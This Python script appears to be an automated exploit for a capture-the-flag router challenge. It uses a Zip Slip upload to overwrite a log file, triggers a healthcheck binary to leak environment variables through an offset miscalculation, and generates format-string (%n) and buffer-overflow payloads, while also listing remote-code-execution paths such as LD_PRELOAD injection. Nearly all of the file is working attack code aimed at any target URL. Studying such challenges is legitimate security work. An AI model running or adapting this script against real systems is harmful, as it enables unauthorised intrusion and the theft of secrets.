#!/usr/bin/env python3
"""
Awesome Router Player - Automated Exploitation Framework
Exploits the healthcheck binary vulnerability to leak environment variables
and craft RCE payloads.

Author: Security Researcher
Challenge: Information Leak → RCE via Format String / Buffer Overflow
"""

import requests
import json
import sys
import os
import zipfile
import tempfile
import struct
import re
import argparse
from urllib.parse import urljoin
from typing import Dict, List, Tuple, Optional

class RoutherExploit:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.leaked_data = {}
        self.env_vars = {}
        
    def upload_zip(self, zip_path: str) -> bool:
        """Upload a zip file to the router."""
        # print(f"[*] Uploading zip file: {zip_path}")
        try:
            with open(zip_path, 'rb') as f:
                files = {'file': f}
                response = self.session.post(f"{self.base_url}/upload", files=files)
            if response.status_code in [200, 201]:
                # print(f"[+] ZIP uploaded successfully")
                return True
            else:
                print(f"[-] Upload failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Upload error: {e}")
            return False
    
    def create_payload_zip(self, content: str = None) -> str:
        """Create a zip file for triggering the vulnerability via Zip Slip."""
        # print(f"[*] Creating payload zip file") # Reduce noise
        temp_dir = tempfile.mkdtemp()
        zip_path = os.path.join(temp_dir, "payload.zip")
        
        try:
            with zipfile.ZipFile(zip_path, 'w') as zf:
                # Use Zip Slip to overwrite /tmp/logs
                # Uploads go to /tmp/uploads/, so ../logs targets /tmp/logs
                filename = "../logs"
                
                if content is None:
                    # Default content if none provided
                    content = "[init] [1] : init : init"
                
                # Ensure it ends with newline
                if not content.endswith('\n'):
                    content += '\n'
                    
                zf.writestr(filename, content)
                
            # print(f"[+] Payload zip created: {zip_path}")
            return zip_path
        except Exception as e:
            print(f"[-] Error creating zip: {e}")
            return None
    
    def activate_healthcheck(self) -> bool:
        """Trigger the healthcheck endpoint to execute the vulnerable binary."""
        print(f"[*] Activating healthcheck...")
        try:
            response = self.session.get(f"{self.base_url}/healthcheck", timeout=10)
            if response.status_code == 200:
                print(f"[+] Healthcheck activated")
                return True
            else:
                print(f"[-] Healthcheck failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Healthcheck error: {e}")
            return False
    
    def leak_environment_variable(self, log_id: int) -> Optional[str]:
        """
        Exploit the mathematical mismatch to leak environment variables.
        """
        # print(f"[*] Attempting to leak using ID: {log_id}")
        
        try:
            # Create a log entry with the specific ID
            timestamp = "2026-01-24 12:00:00"
            log_entry = f"[{timestamp}] [{log_id}] : vulnerable : details.txt"
            
            # Create and upload zip with this log entry
            zip_path = self.create_payload_zip(log_entry)
            if not zip_path:
                return None
                
            if not self.upload_zip(zip_path):
                return None
            
            # Clean up zip
            try:
                os.remove(zip_path)
            except:
                pass
            
            # Trigger healthcheck
            response = self.session.get(f"{self.base_url}/healthcheck", timeout=10)
            if response.status_code == 200:
                # Parse response to extract leaked data
                leaked = self._parse_leak_response(response.text, log_id)
                if leaked:
                    print(f"[+] Leaked (ID {log_id}): {leaked}")
                    return leaked
        except Exception as e:
            print(f"[-] Leak error for ID {log_id}: {e}")
        
        return None
    
    def _parse_leak_response(self, response_text: str, log_id: int) -> Optional[str]:
        """Extract leaked data from healthcheck response."""
        # Pattern: "service name: <value>"
        pattern = r"service name: ([^\n]+)"
        matches = re.findall(pattern, response_text)
        
        if matches:
            return matches[-1].strip()  # Return last match
        return None
    
    def calculate_leak_offsets(self) -> Dict[int, str]:
        """
        Calculate which log IDs will leak which data based on the binary's math.
        
        Math:
        - EnvVar i is stored at: Base + (i * 64) + 32
        - Accessed at: Base + (ID - 1) * 16
        
        To leak EnvVar i: (i * 64) + 32 = (ID - 1) * 16
        Solving: ID = ((i * 64) + 32) / 16 + 1 = (4*i + 2) + 1 = 4*i + 3
        """
        magic_ids = {}
        
        # Hardcoded strings (offsets 0 and 16)
        magic_ids[1] = "ntcheck"        # Offset 0
        magic_ids[2] = "drcheck"        # Offset 16
        
        # Environment variables (using the formula: ID = 4*i + 3)
        for env_index in range(32):
            leak_id = 4 * env_index + 3
            magic_ids[leak_id] = f"EnvVar_{env_index}"
        
        return magic_ids
    
    def extract_all_env_vars(self) -> Dict[int, str]:
        """
        Extract all available environment variables using the vulnerability.
        """
        print("\n[*] === ENVIRONMENT VARIABLE EXTRACTION ===")
        print("[*] Calculating magic IDs based on binary math...")
        
        magic_ids = self.calculate_leak_offsets()
        
        print(f"\n[*] Total leakable IDs: {len(magic_ids)}")
        print("[*] Starting extraction...")
        
        for log_id, expected_var in magic_ids.items():
            # In a real scenario, you would inject a log entry with this ID
            # and trigger the healthcheck to process it
            leaked = self.leak_environment_variable(log_id)
            if leaked:
                self.leaked_data[log_id] = leaked
                self.env_vars[expected_var] = leaked
        
        return self.env_vars
    
    def analyze_exploitability(self):
        """
        Analyze what can be done with the leaked environment variables.
        """
        print("\n" + "="*70)
        print("EXPLOITATION ANALYSIS")
        print("="*70)
        
        analysis = {
            "INFORMATION_LEAK": {
                "severity": "CRITICAL",
                "description": "Mathematical mismatch in offset calculation allows arbitrary memory reads",
                "impact": "Can leak: environment variables, stack values, function pointers",
                "mitigation": "Validate ID values; use consistent offset calculations"
            },
            "RCE_PATHS": {
                "PATH_1": {
                    "name": "Format String Injection",
                    "requirement": "Leaked function pointer or format string in environment",
                    "technique": "Use %n, %x, %s in log entry details field",
                    "difficulty": "Medium"
                },
                "PATH_2": {
                    "name": "Buffer Overflow via Log Entry",
                    "requirement": "Overflow parse_log_line buffer (32 or 256 byte limits)",
                    "technique": "Send log entry with >32 or >255 byte fields",
                    "difficulty": "Medium - NX/PIE enabled, but Stack Canary disabled"
                },
                "PATH_3": {
                    "name": "Environment Variable Abuse",
                    "requirement": "LD_PRELOAD, LD_LIBRARY_PATH, or similar in env",
                    "technique": "Inject malicious library path via environment",
                    "difficulty": "High - depends on service execution context"
                }
            },
            "KEY_FINDINGS": []
        }
        
        # Analyze leaked data
        if self.env_vars:
            print("\n[*] LEAKED ENVIRONMENT VARIABLES:")
            print("-" * 70)
            for var_name, value in self.env_vars.items():
                print(f"  {var_name}: {value}")
                
                # Check for exploitable patterns
                if "LD_" in var_name or var_name in ["PATH", "LD_PRELOAD", "LD_LIBRARY_PATH"]:
                    analysis["KEY_FINDINGS"].append(
                        f"CRITICAL: {var_name} can be abused for arbitrary code execution"
                    )
                elif value and "/" in value and ".so" in value:
                    analysis["KEY_FINDINGS"].append(
                        f"WARNING: {var_name} contains library path - potential for injection"
                    )
        
        # Print RCE paths
        print("\n[*] POSSIBLE RCE PATHS:")
        print("-" * 70)
        for path_key, path_info in analysis["RCE_PATHS"].items():
            print(f"\n  [{path_info['difficulty']}] {path_info['name']}")
            print(f"    Requirement: {path_info['requirement']}")
            print(f"    Technique: {path_info['technique']}")
        
        # Print key findings
        if analysis["KEY_FINDINGS"]:
            print("\n[!] KEY FINDINGS:")
            print("-" * 70)
            for finding in analysis["KEY_FINDINGS"]:
                print(f"  {finding}")
        
        return analysis
    
    def generate_format_string_payload(self, offset: int = 6) -> str:
        """
        Generate a format string payload for exploitation.
        Assumes %offset position in log details field.
        """
        print("\n[*] GENERATING FORMAT STRING PAYLOAD")
        print("-" * 70)
        
        payloads = {
            "leak_stack": f"%{offset}$lx.%{offset+1}$lx.%{offset+2}$lx",
            "leak_env": f"%{offset}$s",
            "write_memory": f"%{offset}$n"
        }
        
        for name, payload in payloads.items():
            print(f"  {name}: {payload}")
        
        return payloads
    
    def generate_overflow_payload(self) -> str:
        """
        Generate a buffer overflow payload for the parse_log_line function.
        Vulnerable buffers:
        - Timestamp: 48 bytes (31 char limit)
        - State: 32 bytes (31 char limit)
        - Details: 256 bytes (255 char limit)
        """
        print("\n[*] GENERATING BUFFER OVERFLOW PAYLOAD")
        print("-" * 70)
        
        # Craft a payload that overflows the "Details" field
        # 256 byte buffer, but sscanf reads up to 255 characters
        # Can overflow by providing exactly 256+ chars
        
        payload = "A" * 300  # Will overflow 256-byte buffer
        print(f"  Overflow payload: {'A' * 50}... ({len(payload)} bytes total)")
        
        # Format: [timestamp] [id] : state : details
        log_entry = f"[timestamp] [99] : state : {payload}"
        print(f"  Log entry format: {log_entry[:100]}...")
        
        return log_entry
    
    def run_full_exploit(self, create_zip: bool = True) -> bool:
        """Run the complete exploitation chain."""
        print("\n" + "="*70)
        print("AWESOME ROUTER PLAYER - EXPLOITATION FRAMEWORK")
        print("="*70 + "\n")
        
        # Step 1: Upload payload
        if create_zip:
            zip_path = self.create_payload_zip()
            if not zip_path or not self.upload_zip(zip_path):
                print("[-] ZIP upload failed, continuing anyway...")
        
        # Step 2: Activate healthcheck
        if not self.activate_healthcheck():
            print("[-] Healthcheck activation failed")
            return False
        
        # Step 3: Extract environment variables
        self.extract_all_env_vars()
        
        # Step 4: Analyze exploitability
        self.analyze_exploitability()
        
        # Step 5: Generate payloads
        fmt_payloads = self.generate_format_string_payload()
        overflow_payload = self.generate_overflow_payload()
        
        print("\n" + "="*70)
        print("EXPLOITATION FRAMEWORK COMPLETE")
        print("="*70)
        
        return True


def main():
    parser = argparse.ArgumentParser(
        description="Awesome Router Player - Automated Exploitation Script",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 exploit_automation.py http://localhost:8000
  python3 exploit_automation.py http://192.168.1.1:8000 --no-zip
        """
    )
    
    parser.add_argument("url", help="Target URL (e.g., http://localhost:8000)")
    parser.add_argument("--no-zip", action="store_true", help="Skip ZIP file creation/upload")
    
    args = parser.parse_args()
    
    exploit = RoutherExploit(args.url)
    success = exploit.run_full_exploit(create_zip=not args.no_zip)
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
